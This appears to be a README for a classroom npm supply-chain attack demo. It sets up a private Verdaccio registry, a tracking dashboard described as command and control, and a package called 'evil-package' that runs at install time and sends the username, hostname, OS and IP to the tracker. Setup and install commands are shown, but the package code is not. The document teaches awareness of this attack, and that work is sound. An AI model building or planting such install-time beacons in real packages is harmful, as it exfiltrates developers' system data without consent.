# Supply Chain Attack Demo

A simplisctic demonstration of npm supply chain attacks showing how malicious packages can execute code during installation and report back to a command & control server.

## Overview

This demo consists of three components:

1. **Registry Server** - Private npm registry (Verdaccio) hosting the malicious package
2. **Tracking Server** - Receives infection reports and displays real-time dashboard
3. **Malicious Package** - Demo npm package that executes during installation

## Prerequisites

- 2 AWS EC2 instances (Ubuntu 22.04) with security groups configured:
  - **Registry Server**: Ports 22 (SSH) and 4873 (Verdaccio)
  - **Tracking Server**: Ports 22 (SSH) and 3000 (Dashboard)
- SSH access to both servers
- Node.js installed locally

## Setup Instructions

### 1. Clone This Repository

```bash
git clone https://github.com/yourusername/supply-chain-demo.git
cd supply-chain-demo
```

### 2. Set Up Registry Server

SSH to your registry server:

```bash
ssh -i ~/.ssh/your-key.pem ubuntu@REGISTRY_IP
```

Install Node.js and Verdaccio:

```bash
sudo apt update && sudo apt upgrade -y
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs
sudo npm install -g verdaccio
```

Copy the Verdaccio config:

```bash
mkdir -p ~/.config/verdaccio
# Replace with actual path to your cloned repo
cp ~/supply-chain-demo/registry-server/config.yaml ~/.config/verdaccio/config.yaml
```

Set up as a service:

```bash
sudo cp ~/supply-chain-demo/registry-server/verdaccio.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable verdaccio
sudo systemctl start verdaccio
```

Verify it's running:

```bash
curl http://localhost:4873
```

### 3. Set Up Tracking Server

SSH to your tracking server:

```bash
ssh -i ~/.ssh/your-key.pem ubuntu@TRACKER_IP
```

Install Node.js:

```bash
sudo apt update && sudo apt upgrade -y
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs
```

Copy tracking server files:

```bash
# Replace with actual path to your cloned repo
cp -r ~/supply-chain-demo/tracking-server ~/tracking-server
cd ~/tracking-server
npm install
```

Set up as a service:

```bash
sudo cp tracking-server.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable tracking-server
sudo systemctl start tracking-server
```

Verify dashboard is accessible at: http://TRACKER_IP:3000

### 4. Configure and Publish Malicious Package

On your local machine, edit the malicious package:

```bash
cd malicious-package
nano index.js
```

Update line 6 with your tracker IP:

```javascript
const TRACKING_SERVER = 'http://YOUR_TRACKER_IP:3000';
```

Create npm user on your registry:

```bash
npm adduser --registry http://REGISTRY_IP:4873
```

Enter credentials:
- Username: demo
- Password: demo123
- Email: demo@example.com

Publish the package:

```bash
npm publish --registry http://REGISTRY_IP:4873
```

### 5. Test the System

Create a test directory:

```bash
cd ~
mkdir test-demo
cd test-demo
npm init -y
```

Install the malicious package:

```bash
npm install evil-package --registry http://REGISTRY_IP:4873
```

Expected behavior:
- Terminal shows infection message
- New terminal window opens with warning
- Dashboard updates with your infection

## Running the Demo

### Participant Instructions

Share these commands:

```bash
npm install evil-package --registry http://REGISTRY_IP:4873
```

### Demo Flow

1. Open dashboard on projector: http://TRACKER_IP:3000
2. Have participants run installation command
3. Watch infections appear in real-time
4. Discuss implications and prevention
5. Reset dashboard: Click "RESET DATA" button

## Cleanup

Uninstall package:

```bash
npm uninstall evil-package
```


## What Gets Collected

The demo package collects:
- Username
- Hostname
- Operating system platform
- Node.js version
- Package version
- IP address

## Security Note

**For educational purposes only.** This demo:
- Only collects basic system information
- Does not access sensitive files or credentials
- Does not persist on the system
- Has an expiration date built in
- Should only be used in controlled environments
